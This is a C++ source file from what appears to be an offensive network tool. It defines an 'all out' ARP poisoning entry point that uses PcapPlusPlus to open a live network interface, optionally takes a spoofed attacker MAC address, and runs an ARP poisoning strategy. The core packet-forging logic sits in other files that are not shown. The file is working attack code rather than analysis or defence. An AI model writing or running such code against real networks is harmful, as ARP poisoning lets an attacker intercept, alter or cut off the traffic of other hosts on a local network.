#include "arp_poisoning/public.h"
#include "MacAddress.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "arp_poisoning/all_out.h"
#include "arp_poisoning/arp_poisoning_strategy.h"
#include <memory>
#include <stdexcept>

void ATK::ARP::allOutPoison(const AllOutPoisonOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr) {
        throw std::invalid_argument(options.ifaceIpOrName +
                                    " is not a valid interface");
    }

    std::unique_ptr<ATK::ARP::AllOutArpPoisoningStrategy> strategy;
    if (!options.attackerMacAddress.empty()) {

        pcpp::MacAddress macAddress(options.attackerMacAddress);
        strategy = std::make_unique<ATK::ARP::AllOutArpPoisoningStrategy>(
            device, macAddress);
    } else {
        strategy =
            std::make_unique<ATK::ARP::AllOutArpPoisoningStrategy>(device);
    }

    ArpPoisoningContext arpPoisoningContext(std::move(strategy));

    arpPoisoningContext.execute();
}
